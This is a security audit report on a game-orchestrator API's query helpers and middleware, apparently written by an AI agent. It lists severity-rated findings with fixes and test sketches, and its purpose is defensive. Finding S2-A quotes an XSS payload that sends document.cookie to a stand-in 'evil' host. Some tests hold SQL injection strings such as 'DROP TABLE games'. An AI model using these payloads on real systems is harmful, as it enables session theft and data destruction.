# UAT-4 SAST + Middleware Audit
**Agent:** sast-middleware
**Date:** 2026-05-20
**Scope:** BL6/BL7 endpoints + `_query_helpers` + BL5 middleware regression
**Branch:** feat/uat-4-session
**Persona:** senior security engineer (Phase 2.4 mindset — hunt vulnerabilities, describe concrete exploits)

---

## Tool runs

| Tool | Command | Exit | Result |
|---|---|---|---|
| ruff (lint) | `ruff check src/orchestrator/api/ tests/api/` | 0 | "All checks passed!" |
| ruff (format) | `ruff format --check src/orchestrator/api/ tests/api/` | 0 | "21 files already formatted" |
| mypy (strict) | `mypy --strict src/orchestrator/api/` | 0 | "Success: no issues found in 9 source files" |
| semgrep | `semgrep --config p/owasp-top-ten src/orchestrator/api/` | 0 | "0 findings" across 152 rules / 9 files / 100% parsed |
| gitleaks | `gitleaks detect --no-banner --redact --source .` | 0 | "no leaks found" (123 commits, 3.81 MB scanned) |

**Clean SAST sweep.** All findings below are from manual review, not tool output.

---

## Findings

### SEV-1
None.

### SEV-2

**S2-A. `_query_helpers.parse_filters` does not validate string-typed filter values; arbitrary content is round-tripped into `applied_filters` echo (defense-in-depth gap that becomes a stored-XSS vector if a downstream UI is naive).**

- **Description.** `_coerce_value` returns `str`-typed filter values verbatim — no format validation. The spec declares `last_prefilled_at` and `last_validated_at` as `value_type=str` for ISO-8601 timestamps, but ANY string is accepted (no regex, no `datetime.fromisoformat` check). The unvalidated value flows two places: (a) into `?` SQL bind (safe — parametric), (b) back into `meta.applied_filters[<field>][<op>]` as the wire echo (UNSAFE — reflection surface).
- **Concrete exploit / scenario.**
  1. Attacker who has obtained the bearer token (TM-001 / TM-023) or who tricks an authenticated operator into clicking a crafted URL sends:
     `GET /api/v1/games?last_prefilled_at_gte=<img src=x onerror=fetch('https://evil/?'+document.cookie)>`
  2. Server returns 200 with `meta.applied_filters.last_prefilled_at.gte = "<img src=x onerror=...>"`.
  3. Game_shelf (or any future ops UI / curl-wrapper) that naïvely renders the echo as HTML executes the script in the operator's authenticated browser context.
- **Affected code.** `src/orchestrator/api/_query_helpers.py:120-136` (`_coerce_value` — `str` path is the unconditional `return raw`); also `src/orchestrator/api/routers/games.py:46-49` (allow-list declares `value_type=str` for both timestamp fields).
- **Suggested fix.** Add an optional `validator: Callable[[str], None] | None` field to `FilterFieldSpec`. For timestamp fields, set it to `datetime.fromisoformat` (raises `ValueError` → wrapped to `QueryParamError` → 400). Doing this at the API boundary applies the principle: reject bad input at the edge rather than rely on UI sanitization.
- **Regression test sketch.**
  ```python
  def test_iso8601_validation_rejects_xss_payload():
      with pytest.raises(QueryParamError, match="invalid value"):
          parse_filters(
              QueryParams("last_prefilled_at_gte=<script>alert(1)</script>"),
              allow_list=_games_allow_list(),
          )
  ```
  Plus a router-level test asserting 400 (not 200 with reflected payload).

---

**S2-B. `_in=` operator has no upper bound on number of values; SQLite's default `SQLITE_LIMIT_VARIABLE_NUMBER` (999) can be exceeded → 503 with reader-pool work amplification.**

- **Description.** `parse_filters` splits on `,` with no cap on element count. `build_where_clause` then emits `field IN (?, ?, ?, ...)` with one `?` per value. SQLite caps total bind variables per statement (default 999). A request like `?status_in=a,b,c,...×1500` will fail at `pool.read_one(count_sql, where_params)` with `SQLITE_TOOBIG`/`SQLITE_RANGE` — wrapped to `PoolError` → 503. An attacker with a token can flood `/api/v1/games?status_in=<lots>` to (a) churn the reader pool with failing queries and noisy 503 logs, (b) generate massive per-request log lines (each containing the full param list in structlog event), (c) fingerprint the SQLite build's exact limit.
- **Concrete exploit / scenario.** Authenticated DoS amplifier. Each request is ~30 KB URL → ~7500-element `IN` list → 503 after ~5 ms of work. At 100 req/s an attacker holds 1+ reader connections busy churning failures and writes ~30 KB × 100/s ≈ 3 MB/s of log data to wherever structlog sinks (disk → fills `/state` volume; remote → bandwidth).
- **Affected code.** `src/orchestrator/api/_query_helpers.py:179-184` (no len() cap on `raw_value.split(",")`); also `build_where_clause` lines 218-221.
- **Suggested fix.** Cap `_in` cardinality in `parse_filters` (suggest 100 or `min(50, max_limit)` since matching that many statuses is nonsense). Raise `QueryParamError(f"_in list too long: max 100 values, got {len(values)}")`.
- **Regression test sketch.**
  ```python
  def test_in_operator_rejects_excessive_values():
      huge = ",".join(["x"] * 200)
      with pytest.raises(QueryParamError, match="too long"):
          parse_filters(QueryParams(f"status_in={huge}"), allow_list=_games_allow_list())
  ```

---

### SEV-3

**S3-A. `build_order_by_clause` lacks the defensive re-validation pattern that `build_where_clause` has — caller-trust gap on SQL identifier interpolation.**

- **Description.** `build_where_clause` (line 214) re-checks `field_name not in allow_list.by_field` before interpolating. `build_order_by_clause` (line 289-294) does NOT take an allow-list and does NOT re-validate — it trusts `SortField.field` was already validated by `parse_sort`. This is asymmetric defense-in-depth. If a future router constructs `SortField` instances manually (e.g., `SortField(field="title; DROP TABLE games", direction="asc")`), the field is f-stringed into the SQL with no check. Worse, `direction` is typed `Literal["asc", "desc"]` but Python doesn't enforce that at runtime — a caller passing `direction="asc; DELETE FROM games"` causes raw injection via `.upper()`.
- **Concrete exploit / scenario.** No current exploit (router only calls `parse_sort`, which validates). But the helper is explicitly designed to be reused by future paginated endpoints (`/jobs`, `/manifests`, `/stats`, `/block_list`). A future BL adds a router that builds `SortField` from a config file or admin endpoint without going through `parse_sort` → SQL injection.
- **Affected code.** `src/orchestrator/api/_query_helpers.py:289-294`.
- **Suggested fix.** Change `build_order_by_clause` signature to `(sort: list[SortField], *, allow_list: SortAllowList)` and re-check both `s.field in allow_list.fields` AND `s.direction in ("asc", "desc")`. Mirror the `build_where_clause` re-check pattern.
- **Regression test sketch.**
  ```python
  def test_order_by_rejects_manually_constructed_wild_field():
      with pytest.raises(QueryParamError):
          build_order_by_clause(
              [SortField(field="title; DROP TABLE games", direction="asc")],
              allow_list=_games_sort_allow_list(),
          )
  ```

---

**S3-B. `build_where_clause` raises `KeyError` (→ 500) instead of `QueryParamError` (→ 400) when caller hands it an unrecognized op.**

- **Description.** Line 223: `_OP_SQL[op].format(field=field_name)` — if `op` is not a key of `_OP_SQL` (only "in" is special-cased earlier), Python raises `KeyError`. The router catches `QueryParamError` for 400 but does not catch `KeyError`, so this becomes a 500 with a stack trace event. The defensive re-check on `field_name` (line 214) does not cover op typos.
- **Concrete exploit / scenario.** Not user-reachable today (parse_filters allows only ops the suffix loop emits, all of which are in `_OP_SQL`). Becomes user-reachable as soon as a future router constructs the filters dict by hand or adds a new operator name to the suffix loop without updating `_OP_SQL`. Trips immediately during refactor → noisy 500s in prod.
- **Affected code.** `src/orchestrator/api/_query_helpers.py:223` (the `_OP_SQL[op]` lookup, vs. line 214's `field_name` check).
- **Suggested fix.** Add a parallel defensive check: `if op != "in" and op not in _OP_SQL: raise QueryParamError(f"unknown operator: {op}")` immediately inside the loop body before line 218.
- **Regression test sketch.**
  ```python
  def test_build_where_rejects_unknown_op():
      with pytest.raises(QueryParamError, match="unknown operator"):
          build_where_clause(
              {"platform": {"contains": "steam"}},  # invalid op
              allow_list=_games_allow_list(),
          )
  ```

---

**S3-C. Hypothesis property test coverage is too narrow to credibly claim "no SQL injection across the helper surface".**

- **Description.** `TestSqlInjectionResistance.test_build_where_never_interpolates_values` (tests/api/test_query_helpers.py:370-392) fuzzes ONLY the `platform` (str) and `size_bytes` (int) values, ONLY with `eq` and `gte` operators, and ONLY one fixed injection payload (`'; DROP TABLE games; --`). The property test does NOT cover:
  - The `in` operator path (different code path — variable placeholder count)
  - `ne`, `gt`, `lt`, `lte` operators
  - `build_order_by_clause` at all (the entire ORDER BY path has zero property coverage)
  - Field-NAME fuzzing (only values fuzzed; what if `parse_filters` ever leaks a key with `_eq` suffix or weird characters?)
  - Boundary integers (just `int_range`, not specifically 0, MAX_INT, MIN_INT, NaN-ish floats)
- **Concrete exploit / scenario.** Future regression where someone refactors the SQL builder to use `format()` for placeholders instead of literal `?` strings — would slip past the existing single-payload test.
- **Affected code.** `tests/api/test_query_helpers.py:370-392`.
- **Suggested fix.** Expand the property test to fuzz: all 6 ops × value types × the IN-op variable cardinality. Add a separate `TestOrderBySqlInjection` with `@given(field=st.sampled_from([...sortable_fields + injection_payloads...]))` and assert the payload never appears in the built SQL when validated through `parse_sort`. Use `hypothesis.assume()` to scope inputs.
- **Regression test sketch.** Property test mutating the operator alongside the value:
  ```python
  @given(
      op=st.sampled_from(["eq", "ne", "gte", "lte", "gt", "lt"]),
      val=st.one_of(st.integers(), st.text()),
  )
  def test_all_ops_use_placeholders(self, op, val):
      sql, params = build_where_clause(
          {"size_bytes": {op: val}}, allow_list=_games_allow_list()
      )
      assert "?" in sql
      assert str(val) not in sql  # value never literal
      assert params == [val]
  ```

---

**S3-D. `applied_filters` echo wire-shape for the `in` operator is not test-covered; an alias regression would silently emit `"in_"` on the wire.**

- **Description.** `FilterCriterion` uses `in_: list[Any] | None = Field(default=None, alias="in")`. The router builds the criterion via `crit_kwargs["in_"] = value` (games.py:244) then dumps with `model_dump(by_alias=True)` (games.py:262). Pydantic v2 docs say `by_alias=True` propagates to nested models, but `TestGamesAppliedEcho` (tests/api/test_games_router.py:329-346) only verifies `eq` and `gte` round-trip. **Zero tests** verify the `in` echo emits `"in"` (not `"in_"`) on the wire. A future Pydantic upgrade or model refactor that breaks alias-propagation would slip past CI.
- **Concrete exploit / scenario.** Wire-contract regression. Game_shelf UI parses `meta.applied_filters[field].in` and reads `undefined`, silently breaking the "show active filters" panel without alerting CI.
- **Affected code.** `src/orchestrator/api/routers/games.py:99-110, 244, 262`; gap in `tests/api/test_games_router.py:329-346`.
- **Suggested fix.** Add `TestGamesAppliedEcho.test_in_operator_wire_emits_alias`:
  ```python
  async def test_in_operator_wire_emits_alias(self, client, games_pool_100):
      r = await client.get(
          "/api/v1/games?status_in=not_downloaded,pending_update",
          headers={"Authorization": f"Bearer {VALID_TOKEN}"},
      )
      applied = r.json()["meta"]["applied_filters"]
      assert "in" in applied["status"]      # wire alias
      assert "in_" not in applied["status"]  # Python field name
      assert applied["status"]["in"] == ["not_downloaded", "pending_update"]
  ```

---

**S3-E. `json.loads(raw_meta)` is not bounded; pathological JSON could trigger `RecursionError` → uncaught 500.**

- **Description.** `routers/games.py:208` parses `metadata` per row inside `try ... except (json.JSONDecodeError, TypeError)`. `RecursionError` is NEITHER. A metadata blob with ~1000 levels of nested `{` is enough to bust Python's default recursion limit on `json.loads`. The exception propagates out of the row loop → uncaught → 500 with a traceback in logs (probably with the row id, which is fine — but a 500 instead of a graceful per-row null).
- **Concrete exploit / scenario.** No external WRITE path to `games.metadata` exists today, so an attacker cannot place the payload. The F3 library-sync (planned) writes from Steam/Epic API; those APIs return shallow trees in practice. **Pre-emptive fix only** — but cheap to do.
- **Affected code.** `src/orchestrator/api/routers/games.py:207-215`.
- **Suggested fix.** Expand the except clause to `(json.JSONDecodeError, TypeError, RecursionError, ValueError)`. Or, more defensively, parse with a depth cap: parse to a string, count `{` chars, reject if > some threshold. Or wrap in a `try/except Exception` since the per-row fallback (`metadata = None` + log warning) is already the graceful behavior.
- **Regression test sketch.**
  ```python
  async def test_pathological_nested_metadata_returns_null(self, client, populated_pool):
      pathological = "{" * 2000 + "}" * 2000
      async with populated_pool.write_transaction() as tx:
          await tx.execute("UPDATE games SET metadata = ? WHERE id = 1", (pathological,))
      r = await client.get("/api/v1/games?limit=500", headers={"Authorization": f"Bearer {VALID_TOKEN}"})
      assert r.status_code == 200
      game = next(g for g in r.json()["games"] if g["id"] == 1)
      assert game["metadata"] is None
  ```

---

**S3-F. Field-name design constraint not documented: any future filter field whose name ends in `_eq`/`_in`/`_gt`/`_lt`/`_gte`/`_lte`/`_ne` is unrouteable by `parse_filters`.**

- **Description.** The suffix loop in `parse_filters` (lines 164-170) parses operator suffixes greedily. A hypothetical future field `download_lte` (e.g., "less-than-or-equal download count") would always be parsed as field=`download` + op=`lte`, never as field=`download_lte`. There's no comment in `_query_helpers.py` warning future authors. The risk is silent — a developer adding `download_lte` to the allow_list and shipping it; the suffix loop wins; the field appears to "work" via `?download=N` (an unintended interpretation) and is broken when invoked as `?download_lte=N`.
- **Concrete exploit / scenario.** Not a security issue. A maintainability foot-gun that becomes a security issue if the field has different security semantics than the prefix it shadows.
- **Affected code.** `src/orchestrator/api/_query_helpers.py:159-170`.
- **Suggested fix.** Add a docstring warning AND a runtime guard in `FilterAllowList.__init__`: assert no field name ends in any of the operator suffixes; raise `ValueError` at import time so bad declarations fail at module load (not at runtime).
- **Regression test sketch.**
  ```python
  def test_allow_list_rejects_field_with_op_suffix():
      with pytest.raises(ValueError, match="reserved operator suffix"):
          FilterAllowList({"download_lte": FilterFieldSpec(ops={"eq"}, value_type=int)})
  ```

---

### SEV-4

**S4-A. `last_error` truncation convention is duplicated, not centralized.**

- **Description.** Both `routers/platforms.py:19` and `routers/games.py:37` define a local `_LAST_ERROR_TRUNCATE = 200` constant. The next text column with credential-leak potential (e.g., `jobs.error_text`, `manifests.last_error`) requires the next author to remember to apply the same truncation. There's no central constant or helper.
- **Suggested fix.** Move `LAST_ERROR_TRUNCATE_CHARS = 200` (and a tiny `truncate_error(s: str | None) -> str | None` helper) into `orchestrator/api/dependencies.py` or `_query_helpers.py`. Document in CHANGELOG / FEATURES the BL6/BL7 truncation pattern for future routers.
- **Regression test sketch.** N/A — refactor with no behavioral change.

---

**S4-B. Two-query (`COUNT(*)` + `SELECT`) race is design-acknowledged but not test-asserted to fail gracefully.**

- **Description.** `routers/games.py:193-194` issues two separate reads via `_checkout_reader()`, each on its own SQLite connection / WAL snapshot. A concurrent write between the two queries can produce `total` that disagrees with the rows returned: e.g., `total=100`, then a row is inserted, `rows` returns 51 of 101 — `has_more = (0 + 51 < 100) = true`, but on next page `total` may show 101 and rows may shift by one. Spec §6 acknowledges this as "Low likelihood, single-user orchestrator". Not exploitable; mainly correctness-under-concurrency.
- **Suggested fix.** Out of scope for UAT-4; explicit acceptance test would help (assert `has_more` is consistent within ±1 of the actual remainder after a concurrent insert). Or move the two queries into a single read connection / `BEGIN DEFERRED` (read-locked) transaction if pool API supports it.

---

## Non-findings (verified safe — explicit clearance)

- **`parse_filters` operator-suffix confusion (the prompt's `app_id_in_admin=true` hypothetical).** Traced: key=`app_id_in_admin`. Loop tries `_gte`, `_lte`, `_gt`, `_lt`, `_ne`, `_in`, `_eq` suffixes — none match the trailing `_admin`. Field stays as `app_id_in_admin`, op stays `eq`. Then `app_id_in_admin not in allow_list.by_field` → `QueryParamError("unknown filter field: app_id_in_admin")` → 400. **Cleared.**
- **`build_where_clause` parametric build.** Every value path uses `?`. Verified: `op == "in"` uses `?, ?, ?` placeholders (line 219); other ops use `_OP_SQL[op]` strings that all contain literal `?` (lines 91-98). No f-string interpolation of values. **Cleared.**
- **`build_where_clause` defensive field-name re-check (line 214) DOES fire.** Validated via re-reading; if a caller hands the function a filters dict with an unknown field, the re-check raises before f-string interpolation. **Cleared.**
- **`parse_sort` tie-breaker dedup logic.** `id:desc` produces `[SortField(id, desc)]` only — server tie-breaker `id:asc` is correctly skipped via `any(s.field == tie_breaker.field for s in user_sort)` (line 283). Confirmed by `test_tie_breaker_deduplicated_when_user_sorts_by_id`. **Cleared.**
- **`parse_sort` case sensitivity.** Direction is `.lower()` (line 269) so `ASC`/`Desc`/`asc` all map to canonical lowercase. Field name is NOT lowercased — so `ID:asc` and `Id:asc` correctly fail allow-list validation. Because they fail, the tie-breaker dedup `s.field == tie_breaker.field` (case-sensitive compare) is never reached with a non-canonical field. **Cleared.**
- **Bearer enforcement on `/api/v1/games` and `/api/v1/platforms`.** Both paths absent from `AUTH_EXEMPT_PATHS` (dependencies.py:28-33). Confirmed by `TestGamesAuth.test_no_token_returns_401` and equivalent on platforms. **Cleared.**
- **CorrelationId propagation into `api.games.read_failed` and `api.games.metadata_parse_failed`.** Both `_log` calls execute inside the request scope where `request_context(correlation_id=cid)` (middleware.py:70) has set the structlog contextvar. The error log includes correlation_id automatically. **Cleared.**
- **BodySizeCap inactivity on GET.** Neither `routers/games.py` nor `routers/platforms.py` calls `request.body()` or otherwise consumes the body. GET requests have no Content-Length (or 0) so Path 1 of `BodySizeCapMiddleware` is skipped and Path 2's `bytes_received` stays 0. No spurious 413s. **Cleared.**
- **CORS preflight on `/api/v1/games`.** CORS middleware is outermost (UAT-3 S2-F revised order, main.py:165-175); intercepts OPTIONS before BearerAuth sees it. BearerAuth also has an OPTIONS bypass (middleware.py:212) as a belt-and-suspenders. **Cleared.**
- **`applied_filters` `by_alias=True` propagation for nested `FilterCriterion`.** Pydantic v2 documented behavior is that `model_dump(by_alias=True)` recurses into nested models. Manually verified by reading pydantic v2 source semantics — the alias-emission is correct for `eq`/`gte`/`lte`/`ne`/`gt`/`lt` (no alias defined → field name passes through unchanged) and would correctly emit `"in"` for the aliased `in_` field. Just untested at the integration level (see S3-D). **Cleared (behaviorally), but test gap noted as S3-D.**
- **Lifespan + boot interaction with 3 routers.** Router import order in main.py (health → platforms → games) has no side effects; module-level `GAMES_FILTER_ALLOW_LIST` construction is pure data with no I/O; routes don't collide (distinct path leaves). `_lazy_app` PEP-562 pattern unchanged. **Cleared.**
- **Filter allow-list field-name security.** `parse_filters` blocks any field not in the per-endpoint `FilterAllowList.by_field` BEFORE the suffix loop has any influence on SQL. Unicode lookalikes (Cyrillic `о`), percent-encoded NULL, percent-encoded LF — all fail the strict dict-membership check. **Cleared.**
- **No `print()` / debug logging leaks** in any of the 5 files reviewed. All log calls go through `structlog` (which routes through the ID3 redactor chain — verified separately in UAT-3).
- **No secrets in source.** gitleaks scan clean across 123 commits / 3.81 MB. No bearer token, no API key, no test token committed.

---

## New threat candidates (beyond TM-001..TM-023)

| ID (proposed) | Vector | Concrete exploit scenario |
|---|---|---|
| **TM-024 candidate** | Reflected XSS via `applied_filters` echo | (See S2-A.) Bearer-authenticated attacker sends `?last_prefilled_at_gte=<script>...</script>`; payload echoes verbatim in response JSON; downstream UI (Game_shelf) that naïvely innerHTML's the active-filter panel executes the script in operator context. Mitigation = S2-A. |
| **TM-025 candidate** | Pool/log amplification via unbounded `_in=` | (See S2-B.) Token-holding attacker posts `?status_in=a,b,c,...×7500`; SQLite rejects with `SQLITE_TOOBIG`, but each request still consumes a reader connection for the round-trip + writes a ~30 KB log event. 100 req/s → fills `/state` volume or saturates remote log sink. Not covered by TM-015 (which presumed bounded query cost). Mitigation = S2-B `_in` cardinality cap. |
| **TM-026 candidate** | Snapshot drift between `COUNT(*)` and row SELECT | (See S4-B.) Concurrent write between the two reader-pool queries can produce `meta.total` that disagrees with `len(games)`. Not exploitable for code execution; impacts pagination correctness in mixed read/write workload. Currently single-orchestrator + F3 daily = low likelihood. Becomes higher when F3 sync moves to hourly or when a mutating endpoint lands. |
| **TM-027 candidate** | Future `_query_helpers` caller-trust SQL injection | (See S3-A / S3-B.) The shared helper module is explicitly designed for reuse across `/jobs`, `/manifests`, `/stats`, `/block_list`. Two asymmetric defenses (`build_order_by_clause` not re-validating; `build_where_clause` not catching op typos) mean a future caller can introduce SQL injection or 500s by bypassing `parse_filters`/`parse_sort` and calling the builders directly. Highest-leverage finding because the module is the load-bearing primitive for 4+ future endpoints. |
| **TM-028 candidate** | Operator-typo silent over-match via field name overlap with operator suffix | (See S3-F.) Future migration adds field whose name ends in a reserved op suffix (`download_lte`, `prefill_in`, `block_ne`); the suffix parser steals the suffix; the developer thinks the field is filterable but it's not, OR worse, accidentally filters a DIFFERENT shorter field with no clear error. Latent foot-gun specific to the operator-suffix syntax chosen in D4. |

---

## Summary table

| Severity | Count | IDs |
|---|---|---|
| SEV-1 | 0 | — |
| SEV-2 | 2 | S2-A (XSS echo), S2-B (unbounded `_in` DoS) |
| SEV-3 | 6 | S3-A, S3-B, S3-C, S3-D, S3-E, S3-F |
| SEV-4 | 2 | S4-A, S4-B |

**Recommended Fix-Now (per CLAUDE.md severity rules):** S2-A and S2-B (both SEV-2 — defer to Phase 2→3 gate at the latest, but easy to land in UAT-4 remediation). S3-A and S3-B should ride along because they harden the shared helper before more endpoints inherit it.

---

## Verification commands run

```
ruff check src/orchestrator/api/ tests/api/        → 0 (clean)
ruff format --check src/orchestrator/api/ tests/api/ → 0 (21 files formatted)
mypy --strict src/orchestrator/api/                → 0 (9 files, clean)
semgrep --config p/owasp-top-ten src/orchestrator/api/ → 0 (152 rules, 0 findings)
gitleaks detect --no-banner --redact --source .    → 0 (no leaks, 123 commits)
```

All tool-gate checks pass cleanly. All findings above are from manual SAST + design review, not automated tool output.
